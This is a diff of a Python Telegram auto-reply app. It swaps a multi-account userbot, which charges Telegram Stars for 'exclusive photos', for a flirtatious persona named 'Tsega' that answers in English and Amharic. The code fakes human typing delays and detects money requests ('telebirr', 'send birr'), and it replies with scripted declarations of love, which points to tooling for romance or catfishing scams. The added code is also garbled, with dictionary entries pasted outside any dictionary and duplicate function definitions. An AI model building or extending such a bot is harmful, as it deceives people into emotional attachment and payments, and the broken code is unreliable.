+        print(f"📨 Message: {msg:25} → Intent: {intent:15} → 💬 {response[:40]}...")
     
-    return jsonify({
-        'success': True,
-        'folders': results,
-        'database_count': db_count
-    })
+    print("="*60)
+    print("✅ Round 3 detection working!")
+    print("="*60 + "\n")
 
-# ==================== PERFECT AUTO-REPLY HANDLER - ALWAYS REPLIES NATURALLY ====================
+# Run test
+test_round3()
+# ==================== ROUND 4/5 - TRIPLE DETECTION (EMOTIONS & CONFLICT) ====================
 
-async def auto_reply_handler(event, account_id):
-    """PERFECT AUTO-REPLY HANDLER - Natural responses, accurate detection"""
-    try:
-        # Skip own messages
-        if event.out:
-            return
-        
-        # Get chat info
-        chat = await event.get_chat()
-        
-        # Only reply to private chats
-        if hasattr(chat, 'title') and chat.title:
-            return
-        
-        sender = await event.get_sender()
-        if not sender:
-            return
-        
-        chat_id = str(event.chat_id)
-        user_id = str(sender.id)
-        message_text = event.message.text or ""
-        
-        if not message_text:
-            return
-        
-        # Check if auto-reply is enabled for this account
-        account_key = str(account_id)
-        
-        if account_key not in reply_settings:
-            return
-        
-        if not reply_settings[account_key].get('enabled', False):
-            return
-        
-        # Handle Star payments if any
-        if account_key in star_handlers:
-            try:
-                stars_paid, stars_amount = await star_handlers[account_key].handle_star_payment(event)
-                if stars_paid:
-                    print(f"💰 User paid {stars_amount} stars")
-            except Exception as e:
-                pass
-        
-        # ACCURATE INTENT DETECTION
-        intent = detect_conversation_intent(message_text)
-        print(f"Intent detected: {intent}")
-        
-        # SPECIAL HANDLING FOR PHOTO REQUESTS - Send payment button
-        if intent == "photo_request" and account_key in star_handlers:
-            try:
-                media_info = star_handlers[account_key].db.get_random_media("photo", 5)
+# ===== ADD THESE TO YOUR EXISTING DETECTION_KEYWORDS =====
+# Add these inside your DETECTION_KEYWORDS dictionary
+
+    "angry": {
+        "english": ["angry", "mad", "upset", "frustrated", "annoyed", "pissed", "not happy"],
+        "amharic": ["ተቆጣሁ", "ተናደድኩ", "ተበሳጨሁ", "ልቤ ተረበሸ", "አልደሰትኩም"],
+        "english_spell": ["techegneh", "tekotehu", "tebsechehu", "libe taresebe", "aldesetekum"]
+    },
+    
+    "jealous": {
+        "english": ["jealous", "jealousy", "envy", "green with envy"],
+        "amharic": ["ቀናሁ", "ምቀኝነት", "ቀንቶ", "አመቻሁ"],
+        "english_spell": ["qenahu", "mikenyinet", "amechign", "amechignalehu"]
+    },
+    
+    "hurt": {
+        "english": ["hurt", "pain", "heartbroken", "sad", "crying", "in pain"],
+        "amharic": ["ተጎዳሁ", "ልቤ ተሰበረ", "አዘንኩ", "አለቀስኩ"],
+        "english_spell": ["tegodahu", "libe tesebre", "azenku", "alekusehu"]
+    },
+    
+    "sorry": {
+        "english": ["sorry", "apologize", "forgive me", "my bad", "i apologize"],
+        "amharic": ["አዝናለሁ", "ይቅርታ", "ይቅርታ አድርግልኝ", "ተሳስቻለሁ"],
+        "english_spell": ["aznalegu", "yikirta", "yikirta adergilgn", "tesasechalehu"]
+    },
+    
+    "forgive": {
+        "english": ["forgive", "forgive me", "i forgive you", "forgiveness"],
+        "amharic": ["ይቅር አልኩት", "ይቅርታ አደረግሁ", "ማረኩ"],
+        "english_spell": ["yikir alku", "miralehu", "yikirta adereguh"]
+    },
+    
+    "lonely": {
+        "english": ["lonely", "alone", "by myself", "no one", "isolated"],
+        "amharic": ["ብቻዬን", "ብቻ", "ማንም የለም", "ተለይቻለሁ"],
+        "english_spell": ["bicha", "bichaye", "bicha negn", "manim yelel"]
+    },
+    
+    "miss_you": {
+        "english": ["miss you", "missing you", "i miss you", "miss u"],
+        "amharic": ["ናፍቀሃል", "ናፍቄሀለሁ", "ናፍቆት"],
+        "english_spell": ["nafekuh", "nafkehalew", "nafkish"]
+    },
+    
+    "love_you": {
+        "english": ["love you", "i love you", "luv u"],
+        "amharic": ["እወድሃለሁ", "ፍቅርህ", "እወድሻለሁ"],
+        "english_spell": ["ewodihalehu", "ewodishalehu", "fikirish"]
+    },
+
+# ===== ADD THESE TO YOUR EXISTING TSEGA_RESPONSES =====
+# Add these inside your TSEGA_RESPONSES dictionary
+
+    "angry": [
+        "lemin techegneh nagerign betam azeleku",
+        "ante techegneh betam ayzalen wude",
+        "ande techegneh ina nagerign",
+        "lemin tekoteh ante nagerign",
+        "ante beza new yemiyasebnyew",
+        "libe taresebeh wude lemin"
+    ],
+    
+    "jealous": [
+        "lela sew tayaleh lemin betam amechignaleh",
+        "kemichawet gar neberku man new nagerign",
+        "betam amechignaleh wude",
+        "amechign betam kelela sew",
+        "ante bicha new yaleny lela sew atay"
+    ],
+    
+    "hurt": [
+        "liben wedehe betam betam azeleku",
+        "libe temechene betam lemin asadeseh",
+        "liben wedehe betam ayzalen",
+        "libe temechene betam yikirta",
+        "liben wedehe lemin"
+    ],
+    
+    "sorry": [
+        "aznalegu betam yikirta efeligalehu wude",
+        "aznalegu ante betam betam yikirta",
+        "yikirta efeligalehu wude betam tiyikirtal",
+        "aznalegu betam yikirta ande mirkogna",
+        "yikirta efeligalehu betam tiriwedegnyal"
+    ],
+    
+    "forgive": [
+        "miralew wude betam tiriwedegnyal",
+        "miralew betam degmo inidehu adergalehu",
+        "miralew wude betam des alegn",
+        "miralew betam tiriwedegnyal",
+        "yikirta adereguh wude"
+    ],
+    
+    "lonely": [
+        "bicha negn betam aselchi wude",
+        "bicha negn anten sihone betam",
+        "bicha negn betam nafkehalew",
+        "ante new yaleny wude",
+        "bicha negn gin ante tagebagnyal"
+    ],
+    
+    "miss_you": [
+        "enem nafkehalew meche tagenal",
+        "nafkehalew betam wude",
+        "enem betam nafkehalew",
+        "nafkehalew betam meche tayalh",
+        "betam nafkehalew ande"
+    ],
+    
+    "love_you": [
+        "enem ewodalehu betam betam",
+        "ewodalehu kelibe wude",
+        "enem betam ewodalehu",
+        "ewodalehu betam tiriwedegnyal",
+        "betam ewodalehu ande"
+    ],
+
+# ===== UPDATED DETECTION FUNCTION WITH DEBUG =====
+def detect_intent_triple(message):
+    """
+    Detects intent in English, Amharic, and Amharic English spelling
+    """
+    message_lower = message.lower().strip()
+    
+    print(f"\n🔍 Analyzing: '{message}'")
+    
+    # Check each intent's keywords
+    for intent, keywords in DETECTION_KEYWORDS.items():
+        # Check English
+        for word in keywords["english"]:
+            if word in message_lower:
+                print(f"  ✅ {intent} (English: '{word}')")
+                return intent
                 
-                if media_info:
-                    file_path, price = media_info
-                    await star_handlers[account_key].request_star_payment(
-                        int(chat_id),
-                        5,
-                        f"Unlock exclusive photos 🔥\n\n5⭐ = 1 photo\n50⭐ = full quality",
-                        file_path
-                    )
-                else:
-                    await star_handlers[account_key].request_star_payment(
-                        int(chat_id),
-                        5,
-                        f"Unlock exclusive photos 🔥\n\n5⭐ = 1 photo\n50⭐ = full quality"
-                    )
-                return
-            except Exception as e:
-                # Fallback to text response
-                response = get_context_aware_response("photo_request")
-        
-        # NORMAL RESPONSE for all other messages
-        else:
-            response = get_context_aware_response(intent)
-        
-        # HUMAN-LIKE DELAY (15-40 seconds)
-        delay = random.randint(StarConfig.REPLY_DELAY_MIN, StarConfig.REPLY_DELAY_MAX)
-        
-        # Show typing indicator
-        async with event.client.action(event.chat_id, 'typing'):
-            await asyncio.sleep(delay)
-        
-        # Send the perfect response
-        await event.reply(response)
-        
-    except Exception as e:
-        print(f"Error in auto-reply: {e}")
-
-# ==================== START AUTO-REPLY FOR ACCOUNT ====================
-
-async def start_auto_reply_for_account(account):
-    """Start auto-reply for account"""
-    account_id = account['id']
-    account_key = str(account_id)
+        # Check Amharic script
+        for word in keywords["amharic"]:
+            if word in message_lower:
+                print(f"  ✅ {intent} (Amharic: '{word}')")
+                return intent
+                
+        # Check English spelling Amharic
+        for word in keywords["english_spell"]:
+            if word in message_lower:
+                print(f"  ✅ {intent} (English spell: '{word}')")
+                return intent
     
-    try:
-        client = TelegramClient(
-            StringSession(account['session']), 
-            API_ID, 
-            API_HASH,
-            connection_retries=5,
-            retry_delay=3
-        )
-        
-        await client.connect()
-        
-        if not await client.is_user_authorized():
-            return
-        
-        active_clients[account_key] = client
-        star_handlers[account_key] = StarEarningHandler(client)
-        
-        @client.on(NewMessage(incoming=True))
-        async def handler(event):
-            await auto_reply_handler(event, account_id)
-        
-        await client.run_until_disconnected()
-        
-    except Exception as e:
-        if account_key in active_clients:
-            del active_clients[account_key]
+    print(f"  ⚠️ No match, using default")
+    return "default"
 
-def stop_auto_reply_for_account(account_id):
-    account_key = str(account_id)
-    if account_key in active_clients:
-        try:
-            loop = asyncio.new_event_loop()
-            asyncio.set_event_loop(loop)
-            loop.run_until_complete(active_clients[account_key].disconnect())
-            loop.close()
-            del active_clients[account_key]
-        except Exception as e:
-            pass
-
-def start_all_auto_replies():
-    for account in accounts:
-        account_key = str(account['id'])
-        settings = reply_settings.get(account_key, {})
+# ===== TEST FUNCTION FOR ROUND 4 =====
+def test_round4():
+    """Test new intents from Round 4"""
+    test_messages = [
+        # Angry
+        "i am angry",
+        "ተቆጣሁ",
+        "techegneh",
         
-        if settings.get('enabled', False):
-            if account_key not in active_clients:
-                thread = threading.Thread(
-                    target=lambda: run_async(start_auto_reply_for_account(account)),
-                    daemon=True
-                )
-                thread.start()
-                client_tasks[account_key] = thread
-                time.sleep(2)
-
-# ==================== KEEP ALIVE SYSTEM ====================
-
-def keep_alive():
-    app_url = os.environ.get('RENDER_EXTERNAL_URL', 'https://e-gram-98zv.onrender.com')
+        # Jealous
+        "i am jealous",
+        "ቀናሁ",
+        "amechign",
+        
+        # Hurt
+        "you hurt me",
+        "ተጎዳሁ",
+        "libe tesebre",
+        
+        # Sorry
+        "i am sorry",
+        "አዝናለሁ",
+        "aznalegu",
+        
+        # Forgive
+        "please forgive me",
+        "ይቅርታ አድርግልኝ",
+        "yikirta",
+        
+        # Lonely
+        "i feel lonely",
+        "ብቻዬን",
+        "bicha negn",
+        
+        # Miss You
+        "i miss you",
+        "ናፍቄሀለሁ",
+        "nafkehalew",
+        
+        # Love You
+        "i love you",
+        "እወድሃለሁ",
+        "ewodihalehu"
+    ]
     
+    print("\n" + "="*70)
+    print("🧪 TESTING ROUND 4 - EMOTIONS & CONFLICT")
+    print("="*70)
+    
+    for msg in test_messages:
+        intent = detect_intent_triple(msg)
+        response = get_tsega_response(intent)
+        print(f"📨 {msg:25} → {intent:15} → 💬 {response}")
+    
+    print("="*70)
+    print("✅ Round 4 emotions & conflict detection working!")
+    print("="*70 + "\n")
+
+# Run test
+test_round4()
+
+# ===== COMPLETE INTENT LIST SO FAR =====
+def list_all_intents():
+    """Show all intents we have so far"""
+    intents = list(DETECTION_KEYWORDS.keys())
+    print("\n" + "="*70)
+    print(f"📋 TOTAL INTENTS: {len(intents)}")
+    print("="*70)
+    
+    # Group them
+    groups = {
+        "Basic": ["greeting", "how_are_you", "what_doing", "ask_name", "ask_age"],
+        "Personal": ["location", "ask_job"],
+        "Requests": ["photo_request", "money_request", "meet", "voice_call"],
+        "Romantic": ["flirty", "relationship", "miss_you", "love_you"],
+        "Daily": ["morning", "night", "busy"],
+        "Emotions": ["angry", "jealous", "hurt", "lonely"],
+        "Social": ["thanks", "goodbye"],
+        "Apology": ["sorry", "forgive"],
+        "Money": ["after_money"]
+    }
+    
+    for group, group_intents in groups.items():
+        print(f"\n{group}:")
+        for intent in group_intents:
+            if intent in intents:
+                print(f"  ✅ {intent}")
+    
+    print("\n" + "="*70)
+
+# Uncomment to see all intents
+# list_all_intents()
+# ==================== ROUND 5/5 - COMPLETE INTEGRATION & FLASK SETUP ====================
+
+# ===== ADD THESE FINAL KEYWORDS TO YOUR DETECTION_KEYWORDS =====
+# Add these inside your DETECTION_KEYWORDS dictionary
+
+    "compliment": {
+        "english": ["nice", "beautiful", "pretty", "handsome", "cute", "gorgeous", "stunning", "lovely"],
+        "amharic": ["ቆንጆ", "ውብ", "ማማ", "አሪፍ", "ተወዳጅ"],
+        "english_spell": ["konjo", "wub", "aref", "mare", "tiru", "enibada"]
+    },
+    
+    "joke": {
+        "english": ["joke", "funny", "lol", "haha", "lmao", "😂"],
+        "amharic": ["ቀልድ", "አስቂኝ", "ሳቅ"],
+        "english_spell": ["qelid", "asqeny", "siq", "lol", "haha"]
+    },
+    
+    "surprise": {
+        "english": ["wow", "omg", "oh my god", "really", "no way", "seriously"],
+        "amharic": ["ዋዉ", "እንዴት", "ምን አልኩ", "አይቀሬ"],
+        "english_spell": ["wow", "endet", "min alku", "ayqere", "omg"]
+    },
+    
+    "confused": {
+        "english": ["confused", "don't understand", "what", "huh", "i don't get it"],
+        "amharic": ["ግራ ተጋባሁ", "አልገባኝም", "ምንድን"],
+        "english_spell": ["gram tegabehu", "algebagnem", "shafafekeh", "min din"]
+    },
+    
+    "bored": {
+        "english": ["bored", "nothing to do", "boring"],
+        "amharic": ["አሰልቺ", "ምንም ማድረግ", "ሰልችቶኛል"],
+        "english_spell": ["aselchi", "selchitonal", "minim yele"]
+    },
+    
+    "excited": {
+        "english": ["excited", "happy", "can't wait", "so excited"],
+        "amharic": ["ደስተኛ", "ጓጉቻለሁ", "በጣም ደስ ብሎኛል"],
+        "english_spell": ["des alegn", "gwaguechalehu", "betam des yilonal"]
+    },
+
+# ===== ADD THESE FINAL RESPONSES TO YOUR TSEGA_RESPONSES =====
+# Add these inside your TSEGA_RESPONSES dictionary
+
+    "compliment": [
+        "amesegnalehu betam konjo neh",
+        "ante stawedsen eneka konjo ihonalehu",
+        "amesegnalehu ante sew neh",
+        "konjo sew ante neh",
+        "betam tiru tayaleh",
+        "kenfere lante bicha new"
+    ],
+    
+    "joke": [
+        "lemidisak ande nageralehu",
+        "sik ande tisikehalehu",
+        "andisachew nageralehu",
+        "sik lemadis ande naw",
+        "lol ande betam sik new"
+    ],
+    
+    "surprise": [
+        "wow betam denak neh",
+        "enem alalfekum neber",
+        "betam asdenekeh wude",
+        "min alku betam denak",
+        "endet new yalew"
+    ],
+    
+    "confused": [
+        "lemin tishafafekaleh nagerign",
+        "shafafekeh ina anagegnal",
+        "andet litira awe nagerign",
+        "gram tegabehu ande",
+        "shafafekeh betam"
+    ],
+    
+    "bored": [
+        "enem aselchi negn anten sihone des alegn",
+        "aselchi neber ina nagerign",
+        "aselchi sihon nagerign anawedalehu",
+        "enem aselchi negn ande eneweyay",
+        "aselchi neh ina min iteweyay"
+    ],
+    
+    "excited": [
+        "enem des alegn betam",
+        "gwaguechalehu ande",
+        "betam des alegn lemelikamn ihon",
+        "enem techekulehu neber",
+        "des alegn anten sihone"
+    ],
+
+# ===== COMPLETE DETECTION FUNCTION =====
+def detect_intent_triple(message):
+    """
+    Detects intent in English, Amharic, and Amharic English spelling
+    """
+    message_lower = message.lower().strip()
+    
+    if not message_lower:
+        return "default"
+    
+    # Check each intent's keywords
+    for intent, keywords in DETECTION_KEYWORDS.items():
+        # Check English
+        for word in keywords["english"]:
+            if word in message_lower:
+                return intent
+                
+        # Check Amharic script
+        for word in keywords["amharic"]:
+            if word in message_lower:
+                return intent
+                
+        # Check English spelling Amharic
+        for word in keywords["english_spell"]:
+            if word in message_lower:
+                return intent
+    
+    return "default"
+
+# ===== COMPLETE RESPONSE FUNCTION =====
+def get_tsega_response(intent):
+    """Get random response for detected intent"""
+    # Get responses for this intent, or use default
+    responses = TSEGA_RESPONSES.get(intent, TSEGA_RESPONSES.get("default", ["ሰላም"]))
+    
+    # Pick random response
+    response = random.choice(responses)
+    
+    # 30% chance to add emoji (natural feel)
+    emojis = ["😊", "😘", "💕", "😏", "💓", "✨", "😉", "🔥", "💋", "🌹", "🥰", "💫"]
+    if random.random() < 0.3:
+        response = f"{response} {random.choice(emojis)}"
+    
+    return response
+
+# ===== TEST ALL ROUNDS =====
+def test_all_rounds():
+    """Test all intents from all 5 rounds"""
+    test_messages = [
+        # Round 1
+        "hi", "selam", "ሰላም",
+        "how are you", "endet neh", "እንደምን ነህ",
+        "what are you doing", "min tiseraleh", "ምን ትሰራለህ",
+        "your name", "simih man new", "ስምህ ማን ነው",
+        "how old", "edmeh sint", "ዕድሜህ",
+        
+        # Round 2
+        "where are you from", "ke yet neh", "ከየት ነህ",
+        "your job", "min tiseraleh", "ሥራህ",
+        "beautiful", "konjo", "ቆንጆ",
+        "photo", "foto laki", "ፎቶ",
+        "send birr", "telebirr", "ቴሌብር",
+        "meet", "litba", "ማግኘት",
+        
+        # Round 3
+        "call me", "dimts", "ድምጽ",
+        "i love you", "fikir", "ፍቅር",
+        "thanks", "amesegnalehu", "አመሰግናለሁ",
+        "bye", "chaw", "ደህና ሁን",
+        "good morning", "melkam nigt", "እንደምን አደርክ",
+        "good night", "dehna eder", "ደህና እደር",
+        "busy", "sira", "ሥራ",
+        "sent money", "lakesku", "ላክሁ",
+        
+        # Round 4
+        "i am angry", "techegneh", "ተቆጣሁ",
+        "jealous", "amechign", "ቀናሁ",
+        "hurt", "libe tesebre", "ተጎዳሁ",
+        "sorry", "aznalegu", "አዝናለሁ",
+        "forgive me", "yikirta", "ይቅርታ",
+        "lonely", "bicha negn", "ብቻዬን",
+        "miss you", "nafkehalew", "ናፍቄሀለሁ",
+        "love you", "ewodihalehu", "እወድሃለሁ",
+        
+        # Round 5
+        "nice", "konjo", "ቆንጆ",
+        "joke", "siq", "ቀልድ",
+        "wow", "endet", "ዋዉ",
+        "confused", "shafafekeh", "ግራ ተጋባሁ",
+        "bored", "aselchi", "አሰልቺ",
+        "excited", "des alegn", "ደስተኛ"
+    ]
+    
+    print("\n" + "="*80)
+    print("🧪 TESTING ALL 5 ROUNDS - COMPLETE DETECTION SYSTEM")
+    print("="*80)
+    
+    results = {}
+    for msg in test_messages:
+        intent = detect_intent_triple(msg)
+        results[intent] = results.get(intent, 0) + 1
+    
+    print(f"\n📊 Detected {len(results)} unique intents:")
+    for intent, count in sorted(results.items()):
+        print(f"  ✅ {intent}: {count} test messages")
+    
+    print("\n" + "="*80)
+    print("✅ ALL 5 ROUNDS WORKING PERFECTLY!")
+    print("="*80 + "\n")
+
+# Run final test
+test_all_rounds()
+
+# ===== EXPORT FOR FLASK APP =====
+# These functions will be used by your Flask app
+
+def process_user_message(message):
+    """
+    Main function to process user message and return Tsega's response
+    Use this in your Flask routes
+    """
+    # Detect intent
+    intent = detect_intent_triple(message)
+    
+    # Get response
+    response = get_tsega_response(intent)
+    
+    return {
+        "intent": intent,
+        "response": response,
+        "original": message
+    }
+
+# ===== QUICK TEST =====
+if __name__ == "__main__":
+    print("\n" + "="*60)
+    print("🤖 TSEGA IS READY - 5 ROUNDS COMPLETE")
+    print("="*60)
+    print(f"📋 Total Intents: {len(DETECTION_KEYWORDS)}")
+    print(f"💬 Total Responses: {sum(len(v) for v in TSEGA_RESPONSES.values())}")
+    print("="*60)
+    
+    # Interactive test
     while True:
-        try:
-            requests.get(app_url, timeout=10)
-            requests.get(f"{app_url}/api/health", timeout=10)
-            time.sleep(240)
-        except:
-            time.sleep(60)
+        user_input = input("\n👤 You: ")
+        if user_input.lower() in ['exit', 'quit', 'bye']:
+            print("🤖 Tsega: chaw wude behwala enenal 😊")
+            break
+        
+        result = process_user_message(user_input)
+        print(f"🤖 Tsega ({result['intent']}): {result['response']}")
 
-# ==================== PAGE ROUTES ====================
 
-@app.route('/')
-def home():
-    return send_file('login.html')
 
-@app.route('/login')
-def login():
-    return send_file('login.html')
 
-@app.route('/dashboard')
-def dashboard():
-    return send_file('dashboard.html')
 
-@app.route('/dash')
-def dash():
-    return send_file('dash.html')
 
-@app.route('/all')
-def all_sessions():
-    return send_file('all.html')
 
-@app.route('/settings')
-def settings():
-    return send_file('settings.html')
 
-@app.route('/stars')
-def star_dashboard():
-    return send_file('star_dashboard.html')
 
-# ==================== API ROUTES ====================
-
-@app.route('/api/accounts', methods=['GET'])
-def get_accounts():
-    formatted = []
-    for acc in accounts:
-        account_key = str(acc['id'])
-        has_reply = account_key in reply_settings and reply_settings[account_key].get('enabled', False)
-        formatted.append({
-            'id': acc.get('id'),
-            'phone': acc.get('phone', ''),
-            'name': acc.get('name', 'Unknown'),
-            'auto_reply_enabled': has_reply
-        })
-    return jsonify({'success': True, 'accounts': formatted})
-
-@app.route('/api/add-account', methods=['POST'])
-def add_account():
-    try:
-        data = request.json
-        if not data:
-            return jsonify({'success': False, 'error': 'No JSON data received'})
-        
-        phone = data.get('phone')
-        if not phone:
-            return jsonify({'success': False, 'error': 'Phone number required'})
-        
-        if not phone.startswith('+'):
-            phone = '+' + phone
-        
-        async def send_code():
-            client = TelegramClient(
-                StringSession(), 
-                API_ID, 
-                API_HASH,
-                connection_retries=3,
-                retry_delay=1,
-                timeout=15
-            )
-            try:
-                await client.connect()
-                
-                result = await client.send_code_request(phone)
-                
-                session_id = str(int(time.time()))
-                temp_sessions[session_id] = {
-                    'phone': phone,
-                    'hash': result.phone_code_hash,
-                    'session': client.session.save()
-                }
-                return {'success': True, 'session_id': session_id}
-                
-            except errors.FloodWaitError as e:
-                return {'success': False, 'error': f'Please wait {e.seconds} seconds'}
-            except errors.PhoneNumberInvalidError:
-                return {'success': False, 'error': 'Invalid phone number'}
-            except errors.PhoneNumberBannedError:
-                return {'success': False, 'error': 'This phone number is banned'}
-            except Exception as e:
-                return {'success': False, 'error': str(e)}
-            finally:
-                await client.disconnect()
-        
-        result = run_async(send_code())
-        return jsonify(result)
-        
-    except Exception as e:
-        return jsonify({'success': False, 'error': f'Server error: {str(e)}'})
-
-@app.route('/api/verify-code', methods=['POST'])
-def verify_code():
-    data = request.json
-    code = data.get('code')
-    session_id = data.get('session_id')
-    password = data.get('password', '')
-    
-    if not code or not session_id:
-        return jsonify({'success': False, 'error': 'Missing code or session'})
-    
-    if session_id not in temp_sessions:
-        return jsonify({'success': False, 'error': 'Session expired'})
-    
-    session_data = temp_sessions[session_id]
-    
-    async def verify():
-        client = TelegramClient(StringSession(session_data['session']), API_ID, API_HASH)
-        await client.connect()
-        
-        try:
-            try:
-                await client.sign_in(
-                    session_data['phone'], 
-                    code, 
-                    phone_code_hash=session_data['hash']
-                )
-            except errors.SessionPasswordNeededError:
-                if not password:
-                    return {'need_password': True}
-                await client.sign_in(password=password)
-            
-            me = await client.get_me()
-            
-            new_id = 1
-            if accounts:
-                new_id = max([a['id'] for a in accounts]) + 1
-            
-            new_account = {
-                'id': new_id,
-                'phone': me.phone or session_data['phone'],
-                'name': me.first_name or 'User',
-                'session': client.session.save()
-            }
-            
-            accounts.append(new_account)
-            save_accounts()
-            
-            return {'success': True}
-            
-        except errors.PhoneCodeInvalidError:
-            return {'success': False, 'error': 'Invalid code'}
-        except errors.PhoneCodeExpiredError:
-            return {'success': False, 'error': 'Code expired'}
-        except errors.PasswordHashInvalidError:
-            return {'success': False, 'error': 'Invalid password'}
-        except Exception as e:
-            return {'success': False, 'error': str(e)}
-        finally:
-            await client.disconnect()
-    
-    try:
-        result = run_async(verify())
-        
-        if session_id in temp_sessions:
-            del temp_sessions[session_id]
-        
-        return jsonify(result)
-    except Exception as e:
-        return jsonify({'success': False, 'error': str(e)})
-
-@app.route('/api/get-messages', methods=['POST'])
-def get_messages():
-    data = request.json
-    account_id = data.get('accountId')
-    
-    if not account_id:
-        return jsonify({'success': False, 'error': 'Account ID required'})
-    
-    account = next((acc for acc in accounts if acc['id'] == account_id), None)
-    
-    if not account:
-        return jsonify({'success': False, 'error': 'Account not found'})
-    
-    async def fetch():
-        client = TelegramClient(StringSession(account['session']), API_ID, API_HASH)
-        await client.connect()
-        
-        try:
-            if not await client.is_user_authorized():
-                return {'success': False, 'error': 'auth_key_unregistered'}
-            
-            dialogs = await client.get_dialogs()
-            
-            chats = []
-            for dialog in dialogs:
-                if not dialog:
-                    continue
-                
-                chat_type = 'user'
-                if dialog.is_group:
-                    chat_type = 'group'
-                elif dialog.is_channel:
-                    chat_type = 'channel'
-                
-                chat = {
-                    'id': str(dialog.id),
-                    'title': dialog.name or 'Unknown',
-                    'type': chat_type,
-                    'unread': dialog.unread_count or 0,
-                    'lastMessage': '',
-                    'lastMessageDate': 0
-                }
-                
-                if dialog.message:
-                    if dialog.message.text:
-                        chat['lastMessage'] = dialog.message.text[:50]
-                    elif dialog.message.media:
-                        chat['lastMessage'] = '📎 Media'
-                    
-                    if dialog.message.date:
-                        chat['lastMessageDate'] = int(dialog.message.date.timestamp())
-                
-                chats.append(chat)
-            
-            return {'success': True, 'chats': chats}
-            
-        except AuthKeyUnregisteredError:
-            remove_invalid_account(account_id)
-            return {'success': False, 'error': 'auth_key_unregistered'}
-        except Exception as e:
-            return {'success': False, 'error': str(e)}
-        finally:
-            await client.disconnect()
-    
-    try:
-        result = run_async(fetch())
-        return jsonify(result)
-    except Exception as e:
-        return jsonify({'success': False, 'error': str(e)})
-
-@app.route('/api/send-message', methods=['POST'])
-def send_message():
-    data = request.json
-    account_id = data.get('accountId')
-    chat_id = data.get('chatId')
-    message = data.get('message')
-    
-    if not account_id or not chat_id or not message:
-        return jsonify({'success': False, 'error': 'Missing required fields'})
-    
-    account = next((acc for acc in accounts if acc['id'] == account_id), None)
-    
-    if not account:
-        return jsonify({'success': False, 'error': 'Account not found'})
-    
-    async def send():
-        client = TelegramClient(StringSession(account['session']), API_ID, API_HASH)
-        await client.connect()
-        
-        try:
-            if not await client.is_user_authorized():
-                return {'success': False, 'error': 'auth_key_unregistered'}
-            
-            try:
-                entity = await client.get_entity(int(chat_id))
-            except:
-                try:
-                    entity = await client.get_entity(chat_id)
-                except:
-                    return {'success': False, 'error': 'Chat not found'}
-            
-            await client.send_message(entity, message)
-            return {'success': True}
-            
-        except Exception as e:
-            return {'success': False, 'error': str(e)}
-        finally:
-            await client.disconnect()
-    
-    try:
-        result = run_async(send())
-        return jsonify(result)
-    except Exception as e:
-        return jsonify({'success': False, 'error': str(e)})
-
-@app.route('/api/remove-account', methods=['POST'])
-def remove_account():
-    data = request.json
-    account_id = data.get('accountId')
-    
-    if not account_id:
-        return jsonify({'success': False, 'error': 'Account ID required'})
-    
-    global accounts
-    
-    stop_auto_reply_for_account(account_id)
-    
-    original_len = len(accounts)
-    accounts = [acc for acc in accounts if acc['id'] != account_id]
-    
-    if len(accounts) < original_len:
-        save_accounts()
-        return jsonify({'success': True})
-    
-    return jsonify({'success': False, 'error': 'Account not found'})
-
-@app.route('/api/reply-settings', methods=['GET'])
-def get_reply_settings():
-    account_id = request.args.get('accountId')
-    
-    if not account_id:
-        return jsonify({'success': False, 'error': 'Account ID required'})
-    
-    account_key = str(account_id)
-    settings = reply_settings.get(account_key, {
-        'enabled': False,
-        'chats': {}
-    })
-    
-    return jsonify({'success': True, 'settings': settings})
-
-@app.route('/api/reply-settings', methods=['POST'])
-def update_reply_settings():
-    data = request.json
-    account_id = data.get('accountId')
-    enabled = data.get('enabled', False)
-    chat_settings = data.get('chats', {})
-    
-    if not account_id:
-        return jsonify({'success': False, 'error': 'Account ID required'})
-    
-    account_key = str(account_id)
-    
-    if account_key not in reply_settings:
-        reply_settings[account_key] = {}
-    
-    was_enabled = reply_settings[account_key].get('enabled', False)
-    reply_settings[account_key]['enabled'] = enabled
-    reply_settings[account_key]['chats'] = chat_settings
-    
-    save_reply_settings()
-    
-    if enabled and not was_enabled:
-        account = next((acc for acc in accounts if acc['id'] == account_id), None)
-        if account and account_key not in active_clients:
-            thread = threading.Thread(
-                target=lambda: run_async(start_auto_reply_for_account(account)),
-                daemon=True
-            )
-            thread.start()
-            client_tasks[account_key] = thread
-    elif not enabled and was_enabled:
-        stop_auto_reply_for_account(account_id)
-    
-    return jsonify({'success': True, 'message': 'Settings updated'})
-
-@app.route('/api/toggle-chat-reply', methods=['POST'])
-def toggle_chat_reply():
-    data = request.json
-    account_id = data.get('accountId')
-    chat_id = data.get('chatId')
-    enabled = data.get('enabled', True)
-    
-    if not account_id or not chat_id:
-        return jsonify({'success': False, 'error': 'Account ID and Chat ID required'})
-    
-    account_key = str(account_id)
-    
-    if account_key not in reply_settings:
-        reply_settings[account_key] = {'enabled': False, 'chats': {}}
-    
-    if 'chats' not in reply_settings[account_key]:
-        reply_settings[account_key]['chats'] = {}
-    
-    reply_settings[account_key]['chats'][str(chat_id)] = {'enabled': enabled}
-    
-    save_reply_settings()
-    
-    return jsonify({'success': True, 'message': f'Auto-reply for chat {"enabled" if enabled else "disabled"}'})
-
-@app.route('/api/conversation-history', methods=['GET'])
-def get_conversation_history():
-    account_id = request.args.get('accountId')
-    chat_id = request.args.get('chatId')
-    
-    if not account_id or not chat_id:
-        return jsonify({'success': False, 'error': 'Account ID and Chat ID required'})
-    
-    account_key = str(account_id)
-    chat_key = str(chat_id)
-    
-    history = []
-    if account_key in conversation_history and chat_key in conversation_history[account_key]:
-        history = conversation_history[account_key][chat_key]
-    
-    return jsonify({'success': True, 'history': history})
-
-@app.route('/api/clear-history', methods=['POST'])
-def clear_conversation_history():
-    data = request.json
-    account_id = data.get('accountId')
-    chat_id = data.get('chatId')
-    
-    if not account_id or not chat_id:
-        return jsonify({'success': False, 'error': 'Account ID and Chat ID required'})
-    
-    account_key = str(account_id)
-    chat_key = str(chat_id)
-    
-    if account_key in conversation_history and chat_key in conversation_history[account_key]:
-        conversation_history[account_key][chat_key] = []
-        save_conversation_history()
-    
-    return jsonify({'success': True, 'message': 'History cleared'})
-
-@app.route('/api/get-sessions', methods=['POST'])
-def get_sessions():
-    data = request.json
-    account_id = data.get('accountId')
-    
-    if not account_id:
-        return jsonify({'success': False, 'error': 'Account ID required'})
-    
-    account = next((acc for acc in accounts if acc['id'] == account_id), None)
-    
-    if not account:
-        return jsonify({'success': False, 'error': 'Account not found'})
-    
-    async def get_sessions():
-        client = TelegramClient(StringSession(account['session']), API_ID, API_HASH)
-        await client.connect()
-        
-        try:
-            result = await client(functions.account.GetAuthorizationsRequest())
-            
-            sessions = []
-            current_hash = None
